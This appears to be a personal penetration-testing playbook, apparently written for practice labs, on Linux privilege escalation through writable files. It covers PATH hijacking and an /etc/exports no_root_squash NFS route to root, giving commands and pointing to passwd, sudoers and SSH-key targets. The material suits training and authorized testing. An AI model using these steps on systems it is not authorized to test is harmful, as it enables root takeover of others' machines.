A writable path matters only when a privileged process consumes it and you can trigger that use safely.

## Goal

Turn a high-value writable file or directory into a verified privilege boundary, with the original state preserved for cleanup.

## Exploitable writable files / directories

**Writable != exploitable**

Before changing anything, prove:

- [ ] the current identity has effective write access;
- [ ] root or another privileged process consumes the path;
- [ ] the execution, reload, restart, login, or other trigger is understood;
- [ ] the resulting execution identity can be verified;
- [ ] the original state can be backed up and restored.

### Step 1: Discover, then triage

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev)/'
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev)/'
```

The output is a candidate list, not a list of privilege escalations. For each promising path, record:

```bash
ls -ld <path>
getfacl <path> 2>/dev/null
test -w <path> && echo writable
```

Also identify the owner/group, privileged consumer, trigger or reload path, execution privilege, backup, and cleanup method.

| Target                                                    | Interpretation and route                                                                                                                              |
| --------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/etc/exports`, writable exports                          | Prove a privileged NFS reload and use the mini playbook below.                                                                                        |
| `/etc/fail2ban/action.d/`                                 | Prove the selected jail uses the action, the action runs with privilege, and a controlled reload/trigger exists. Otherwise stop.                      |
| Root-owned cron file or root-run cron script              | Prove the root job and trigger, then use [[07_Cron_Jobs\|cron]].                                                                                      |
| Writable systemd unit, timer, or privileged service input | Prove `User=`, consumer, and restart/timer path, then use [[09_systemd_services\|systemd]].                                                           |
| Root-run writable script or binary                        | Find the exact privileged consumer and trigger, then route to [[07_Cron_Jobs\|cron]], [[09_systemd_services\|systemd]], or the relevant service case. |
| `/etc/passwd` or `/etc/shadow`                            | Use [[02_etc_passwd_shadow\|passwd and shadow]].                                                                                                      |
| `/etc/sudoers` or `/etc/sudoers.d/`                       | Prepare recovery, validate a candidate with `visudo -cf <candidate_file>`, then use [[03_sudo_misconfig\|sudo]].                                      |
| `/root/.ssh/authorized_keys`                              | Prove traversal and effective write access through every parent directory, then use [[22_ssh#SSH Keys\|the SSH key procedure]].                       |
| Writable directory in a privileged process's `PATH`       | Prove the process calls a bare command and your directory resolves first. Otherwise it is only a writable directory.                                  |

### Writable privileged PATH directory

1. Prove the privileged script/service calls `<bare_command>` without an absolute path.
2. Prove its actual `PATH` resolves a writable directory before the legitimate binary.
3. Confirm `<writable_dir>/<bare_command>` does not already exist, then use a harmless execution marker first.

```bash
ls -ld <writable_dir>
test -w <writable_dir> && echo writable
ls -l <writable_dir>/<bare_command> 2>/dev/null
printf '#!/bin/sh\nid > <marker_file>\n' > <writable_dir>/<bare_command>
chmod +x <writable_dir>/<bare_command>
```

**Verify:** Trigger the proven consumer and inspect `<marker_file>`. Continue only if it shows the expected privileged identity.

**Cleanup:** Remove the test command and marker. If a file existed at that path, do not overwrite it; back it up and prepare exact restoration first.

For directories, check the sticky bit. A writable directory without `t` may permit replacement of another user's file; `drwxrwxrwt` limits deletion to the file owner, directory owner, or root.

### `/etc/exports`: writable exports to live NFS [[PG Practice - lunar]]

Goal: prove the file is writable, prove a privileged reload, confirm the temporary export is live and reachable, use the existing `no_root_squash` route, then restore both file and live state.

**Step 1: Record file and live state**

```bash
ls -l /etc/exports
test -w /etc/exports && echo writable
getfacl /etc/exports 2>/dev/null
cat /etc/exports
exportfs -v
```

`exportfs -v` shows the live export table when permitted. Failure or access denial means use client-side observation or another proven read path; it does not prove that no export exists.

**Step 2: Preserve the original**

```bash
cp /etc/exports <backup_path>/exports.original
sha256sum /etc/exports <backup_path>/exports.original
```

Do not edit until the backup is readable and the hashes match.

**Step 3: Prove the privileged reload**

Identify an already-observed privileged mechanism that applies `/etc/exports`, such as a permitted `exportfs -ra`, NFS service reload, timer, or path unit. Prove who runs it and how it triggers. Do not assume file write access grants permission to run `exportfs`, `systemctl`, or another root action.

No proven privileged reload -> stop and investigate the consumer. A writable but unapplied file is not an exploitable export.

**Step 4: Make one controlled change**

Use the smallest existing directory that supports the objective and restrict it to the required client where possible. The entry shape is:

```text
<export_path> <client_ip>(rw,sync,no_subtree_check,no_root_squash)
```

Do not expose `/` or a broad client range when a narrow path and client are sufficient. Trigger only the reload mechanism proven in Step 3.

**Step 5: Verify the live export**

```bash
exportfs -v
showmount -e <target>
rpcinfo -p <target>
```

Verify the intended path, client restriction, `rw`, and `no_root_squash`. `showmount` can miss an NFSv4-only export, so file changed but live table unchanged means stop. Live but unreachable means check ports, routing, and NFS version through [[111_2049_nfs\|NFS enumeration]].

**Step 6: Use and verify the capability**

Follow [[10_nfs_no_root_squash]] for version-specific mounting and the SUID procedure. On the target, verify the resulting shell with:

```bash
id
```

Success requires effective UID 0. A mounted share or created file alone is not root capability.

**Step 7: Restore and verify cleanup**

```bash
cat <backup_path>/exports.original > /etc/exports
cmp -s /etc/exports <backup_path>/exports.original && echo restored
```

Run the same proven privileged reload a second time. Confirm the temporary live export and client access are gone with `exportfs -v` and the relevant client-side listing/mount test. Remove temporary files created by the linked `no_root_squash` workflow.

### Result guide

| Observation | Decision |
| --- | --- |
| `/etc/exports` writable, no privileged reload proven | Stop and investigate the trigger. |
| File changed, live export unchanged | Do not proceed; the change was not applied. |
| Live export confirmed, attempted NFS version unreachable | Use [[111_2049_nfs\|the NFS version and reachability branch]]. |
| `no_root_squash` route returns effective UID 0 | Record root capability, then clean up. |
| Original file restored and cleanup reload succeeds | Verify the temporary live export and client access are gone. |
